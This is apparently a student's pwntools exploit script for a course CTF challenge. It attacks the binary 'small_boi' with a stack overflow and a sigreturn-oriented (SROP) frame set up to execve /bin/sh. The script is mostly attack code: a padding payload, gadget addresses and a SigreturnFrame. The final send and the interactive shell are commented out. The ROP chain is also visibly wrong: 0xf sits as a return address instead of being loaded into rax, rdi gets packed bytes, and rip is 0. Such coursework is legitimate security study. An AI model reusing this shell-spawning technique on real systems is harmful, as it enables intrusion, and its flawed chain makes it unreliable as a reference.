'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP18: Vuln
File Description:  Solve small_boi via a SROP --- binary written in assembly

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               0               small_boi

File info:
small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped
    Interesting, stripped so no simbles but lib in binary?

Radare2:
afl --> list all functions

Useful Funcs
    bin/sh locatoin in data:    0x004001ca
    syscall:                    0x0000000000400185
'''

# Import Libaries
from pwn import *

# set context for frame creation
context.arch="amd64"

# Variables
padding=b'a'*32
padOverBP=b'a'*8
systemCall = p64(0x0000000000400185)
shell = p64(0x004001ca)
sigRet = p64(0xf)

# Generate ELF
elf = ELF("./small_boi", checksec=False)

# Start a process!
p=process("./small_boi")

# setup stack!
payload = padding
payload += padOverBP 
payload += systemCall  # Generate a system call
payload += sigRet #syscall 0xf is sigreturn

# Send first payload to generate stack
p.sendline(payload)

print("Finding writeable segments!:")
for x in range(0,len(elf.writable_segments)):
    print("Segment %d:" %x, elf.writable_segments[x])
    print("\t"+"Segment %d Data:" %x, elf.writable_segments[x].data())

# Stack generation
frame = SigreturnFrame()
frame.rax = 59
frame.rsp = 0
frame.rbp = 0
frame.rdi = shell
frame.rsi = 0
frame.rdx = 0
frame.rip = 0



'''
# Craft payload 2
payload2 = bytes(frame)

# Send payload then interactive
p.sendline(payload2)
p.interactive()
'''